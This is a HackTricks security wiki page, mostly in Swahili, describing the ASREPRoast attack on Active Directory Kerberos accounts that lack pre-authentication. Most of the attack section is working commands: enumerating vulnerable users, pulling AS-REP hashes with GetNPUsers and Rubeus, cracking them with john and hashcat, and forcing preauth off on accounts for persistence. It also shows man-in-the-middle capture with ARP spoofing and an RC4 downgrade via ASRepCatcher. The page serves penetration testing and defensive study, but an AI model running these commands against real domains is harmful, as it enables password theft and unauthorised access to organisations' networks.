# ASREPRoast

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## ASREPRoast

ASREPRoast ni shambulio la usalama linalotumia watumiaji ambao hawana **sifa inayohitajika ya Kerberos pre-authentication**. Kimsingi, udhaifu huu unaruhusu washambuliaji kuomba uthibitisho wa mtumiaji kutoka kwa Domain Controller (DC) bila kuhitaji nenosiri la mtumiaji. DC kisha inajibu kwa ujumbe uliofungwa kwa kutumia funguo iliyotokana na nenosiri la mtumiaji, ambayo washambuliaji wanaweza kujaribu kuifungua bila mtandao ili kugundua nenosiri la mtumiaji.

Mahitaji makuu ya shambulio hili ni:

* **Ukosefu wa Kerberos pre-authentication**: Watumiaji wa lengo hawapaswi kuwa na kipengele hiki cha usalama kimewezeshwa.
* **Muunganisho na Domain Controller (DC)**: Washambuliaji wanahitaji ufikiaji wa DC ili kutuma maombi na kupokea ujumbe uliofungwa.
* **Akaunti ya kikoa ya hiari**: Kuwa na akaunti ya kikoa kunawawezesha washambuliaji kutambua kwa ufanisi watumiaji walio hatarini kupitia maswali ya LDAP. Bila akaunti kama hiyo, washambuliaji lazima wahakikishe majina ya watumiaji.

#### Kuorodhesha watumiaji walio hatarini (hitaji akidi za kikoa)

{% code title="Using Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Kutumia Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Omba ujumbe wa AS_REP

{% code title="Kutumia Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Kutumia Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting na Rubeus itazalisha 4768 yenye aina ya usimbuaji ya 0x17 na aina ya preauth ya 0.
{% endhint %}

### Kupasua
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistence

Lazimisha **preauth** isiyohitajika kwa mtumiaji ambapo una ruhusa za **GenericAll** (au ruhusa za kuandika mali):

{% code title="Using Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Kutumia Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## ASREProast bila akreditivu

Mshambuliaji anaweza kutumia nafasi ya mtu katikati kukamata pakiti za AS-REP wakati zinapita kwenye mtandao bila kutegemea kuwa Kerberos pre-authentication imezimwa. Hivyo inafanya kazi kwa watumiaji wote kwenye VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) inatufanya tuweze kufanya hivyo. Zaidi ya hayo, chombo hiki kinawalazimisha vituo vya wateja kutumia RC4 kwa kubadilisha mazungumzo ya Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## References

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server kuwasiliana na hackers wenye uzoefu na wawindaji wa makosa!

**Hacking Insights**\
Shiriki na maudhui yanayochunguza msisimko na changamoto za hacking

**Real-Time Hack News**\
Endelea kuwa na habari za hivi punde katika ulimwengu wa hacking kupitia habari na maarifa ya wakati halisi

**Latest Announcements**\
Baki na habari kuhusu makosa mapya yanayoanzishwa na masasisho muhimu ya jukwaa

**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na uanze kushirikiana na hackers bora leo!

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
